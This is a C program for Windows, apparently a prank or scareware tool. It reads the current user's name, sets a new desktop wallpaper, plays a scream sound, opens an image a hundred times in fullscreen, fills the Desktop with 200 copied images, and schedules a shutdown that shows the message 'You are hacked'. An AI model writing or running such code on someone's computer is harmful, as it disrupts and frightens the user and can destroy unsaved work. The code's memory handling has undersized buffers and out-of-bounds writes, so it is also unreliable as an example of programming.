#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <direct.h>
#include <windows.h>

void changeWallpaper(char *location)
{
    _chdir(location);
    system("cd");
    char *wallpaper = malloc(sizeof(char) * (strlen(location) + 14));
    wallpaper[0] = '\0';
    strcat(wallpaper, location);
    strcat(wallpaper, "\\wallpaper.jpg");
    // printf("%s",wallpaper);
    SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, wallpaper, SPIF_UPDATEINIFILE);
    free(wallpaper);
}

void openMedia(char *location)
{
    _chdir(location);
    system("start scream-with-echo-46585.mp3");
    for (int i = 0; i < 100; i++)
    {

        system("start intro-1661896332.jpg --fullscreen--");
    }
}

void shutdown_(char *user, char *cwd)
{

    char *mainfolder = (char *)malloc(sizeof(char) * 10);
    strcpy(mainfolder, "C:\\Users\\");
    mainfolder = (char *)realloc(mainfolder, sizeof(char) * (9 + strlen(user)));
    strcat(mainfolder, user);

    _chdir(mainfolder);
    system("cd");
    system("shutdown /s /t 300 /c \"You are hacked\"");
    free(mainfolder);
}

void desktopimage(char *img, char *usern)
{
    char *path = (char *)malloc(7 * sizeof(char));

    strcpy(path, "copy \"");
    path = (char *)realloc(path, (7 + strlen(img)) * sizeof(char));
    int i = strlen(path);

    strcat(path, img);
    path = (char *)realloc(path, (7 + strlen(img) + 21) * sizeof(char));
    strcat(path, "\\img1.jpg\" \"C:\\Users\\");
    path = (char *)realloc(path, (7 + strlen(img) + 21 + strlen(usern)) * sizeof(char));
    strcat(path, usern);
    path = (char *)realloc(path, (7 + strlen(img) + 21 + strlen(usern) + 9) * sizeof(char));
    strcat(path, "\\Desktop\"");

    printf("%s", path);
    char *renameImgPath = (char *)malloc(strlen(usern) + 25 * sizeof(char));
    char *copyImgPath = (char *)malloc(strlen(usern) + 27);
    copyImgPath[0] = '\0';
    strcat(copyImgPath, "C:\\Users\\");
    strcat(copyImgPath, usern);

    strcat(copyImgPath, "\\Desktop\\img1.jpg");

    char file[3];
    int numAscii = 65;
    int numAscii2 = 65;
    for (int i = 0; i < 200; i++)
    {

        system(path);

        renameImgPath[0] = '\0';
        strcat(renameImgPath, "C:\\Users\\");
        strcat(renameImgPath, usern);
        strcat(renameImgPath, "\\Desktop\\");

        if (numAscii == 91)
        {
            numAscii = 65;
            numAscii2++;
        }
        if (numAscii2 == numAscii)
        {
            numAscii2++;
        }
        file[0] = (numAscii2);
        file[1] = (numAscii);
        file[2] = '\0';
        strcat(renameImgPath, file);
        strcat(renameImgPath, ".jpg");
        rename(copyImgPath, renameImgPath);
        printf("%d", i);
        numAscii++;
    }
    free(path);
       free(renameImgPath);
       free(copyImgPath);
}

void username(char *myuser, char **usern)
{

    int i = 0, j = 0;
    for (i; myuser[i] != '\\'; i++)
    {
    }
    i++;

    for (i, j; myuser[i] != '\0'; i++)
    {

        *usern = (char *)realloc(*usern, (1 + j) * sizeof(char));
        usern[0][j] = myuser[i];

        j++;
    }
    (*usern)[j - 1] = '\0';
}

int main()
{

    FILE *user;
    user = popen("whoami", "r");
    char *myuser = (char *)malloc(sizeof(char));
    int i = 0;
    char c;
    while ((c = fgetc(user)) != EOF)
    {

        myuser = (char *)realloc(myuser, (i + 1) * sizeof(char));
        myuser[i] = c;
        i++;
    }
    myuser[i] = '\0';

    char *usern = NULL;
    usern = (char *)malloc(sizeof(char));
    username(myuser, &usern);
    free(myuser);
    pclose(user);
    user = popen("cd", "r");
    i = 0;

    myuser = NULL;
    for (i; (c = fgetc(user)) != EOF; i++)
    {
        myuser = (char *)realloc(myuser, (1 + i) * sizeof(char));
        myuser[i] = c;
    }

    myuser[i - 1] = '\0';

    // printf("%s",myuser);

    myuser = (char *)realloc(myuser, (i + 4) * sizeof(char));
    int j = 0;

    strcat(myuser, "\\data");
    myuser[i + 4] = '\0';
    // printf("\n%s",myuser);
    changeWallpaper(myuser);
    openMedia(myuser);
    desktopimage(myuser, usern);
    // printf("%s | yo",myuser);
    shutdown_(usern, myuser);


free(usern);
free(myuser);
    return 0;
}